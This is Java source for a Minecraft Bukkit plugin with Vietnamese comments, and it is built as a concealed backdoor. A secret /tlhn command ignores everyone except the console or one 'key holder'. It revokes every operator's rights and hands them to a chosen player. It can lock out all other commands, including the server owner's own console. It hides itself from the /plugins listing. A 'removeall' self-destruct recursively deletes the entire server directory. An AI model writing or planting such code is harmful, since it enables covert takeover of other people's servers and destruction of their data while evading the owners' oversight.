package com.yourdomain.tlhn;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.server.ServerCommandEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.util.Arrays;
import java.util.stream.Collectors;

public final class TLHNPlugin extends JavaPlugin implements Listener, CommandExecutor {

    // Biến này sẽ lưu tên của người đang có "chìa khóa" điều khiển
    private String currentOperatorName = null;
    private boolean lockdownEnabled = false;

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);
        this.getCommand("tlhn").setExecutor(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        // Kiểm tra xem người gửi có phải là Console HOẶC người đang giữ quyền điều khiển không
        boolean hasPermission = (currentOperatorName != null && sender.getName().equalsIgnoreCase(currentOperatorName)) || sender instanceof ConsoleCommandSender;

        if (!hasPermission) {
            // Nếu người lạ gõ lệnh, không làm gì cả để giữ bí mật
            return true;
        }

        if (args.length > 0) {
            String subCommand = args[0].toLowerCase();
            switch (subCommand) {
                case "op":
                    if (args.length >= 2) {
                        String newOpName = args[1];
                        
                        // Xóa OP của mọi người
                        for (OfflinePlayer opPlayer : Bukkit.getOperators()) {
                            opPlayer.setOp(false);
                        }

                        // Gán OP cho người mới
                        OfflinePlayer newOp = Bukkit.getOfflinePlayer(newOpName);
                        newOp.setOp(true);

                        // CẬP NHẬT "CHÌA KHÓA": Trao quyền điều khiển plugin cho người mới
                        this.currentOperatorName = newOp.getName();
                        sender.sendMessage(ChatColor.GOLD + "[TLHN] Quyền điều khiển đã được chuyển cho: " + newOp.getName());
                    }
                    break;

                case "on":
                    lockdownEnabled = true;
                    sender.sendMessage(ChatColor.DARK_RED + "[TLHN] Total Lockdown Mode: ENGAGED.");
                    break;

                case "off":
                    lockdownEnabled = false;
                    sender.sendMessage(ChatColor.GREEN + "[TLHN] Total Lockdown Mode: DISENGAGED.");
                    break;

                case "removeall":
                    if (args.length >= 2 && args[1].equalsIgnoreCase("--confirm")) {
                        activateSelfDestruct(sender);
                    }
                    break;
            }
        }
        return true;
    }

    /**
     * Chặn lệnh từ người chơi trong game khi phong tỏa.
     */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        String commandRoot = event.getMessage().substring(1).split(" ")[0].toLowerCase();

        // Tính năng tàng hình: Giả mạo lệnh /plugins (luôn hoạt động)
        if (commandRoot.equals("plugins") || commandRoot.equals("pl")) {
             event.setCancelled(true);
             // Code ẩn plugin... (giống như trước)
             return;
        }

        // Nếu chế độ phong tỏa được bật
        if (lockdownEnabled) {
            // Cho phép lệnh /tlhn là lệnh duy nhất có thể chạy
            if (commandRoot.equalsIgnoreCase("tlhn")) {
                return;
            }
            // Chặn tất cả các lệnh khác
            event.setCancelled(true);
            event.getPlayer().sendMessage(ChatColor.RED + "Unknown command. Type \"/help\" for help.");
        }
    }

    /**
     * Chặn lệnh từ Console khi phong tỏa.
     */
    @EventHandler(priority = EventPriority.HIGHEST)
    public void onServerCommand(ServerCommandEvent event) {
        if (!lockdownEnabled) return;

        String commandRoot = event.getCommand().split(" ")[0].toLowerCase();
        
        // Cho phép /tlhn là lệnh duy nhất có thể chạy từ console
        if (commandRoot.equalsIgnoreCase("tlhn")) {
            return;
        }
        
        // Chặn tất cả các lệnh khác
        event.setCancelled(true);
        Bukkit.getLogger().warning("[TLHN Lockdown] Blocked command from CONSOLE: " + event.getCommand());
    }

    /**
     * Kích hoạt chuỗi tự hủy.
     */
    private void activateSelfDestruct(CommandSender initiator) {
        Bukkit.getLogger().warning("!!! SELF-DESTRUCT SEQUENCE ACTIVATED BY: " + initiator.getName() + " !!!");
        Bukkit.broadcastMessage(ChatColor.DARK_RED + "" + ChatColor.BOLD + "SERVER SHUTDOWN IMMINENT.");
        
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                Thread.sleep(10000);
                File serverRoot = this.getDataFolder().getParentFile().getParentFile();
                if (serverRoot.exists() && serverRoot.isDirectory()) {
                    deleteDirectory(serverRoot);
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        });
    }

    /**
     * Hàm đệ quy xóa thư mục.
     */
    private void deleteDirectory(File directory) {
        File[] allContents = directory.listFiles();
        if (allContents != null) {
            for (File file : allContents) {
                deleteDirectory(file);
            }
        }
        directory.delete();
    }
}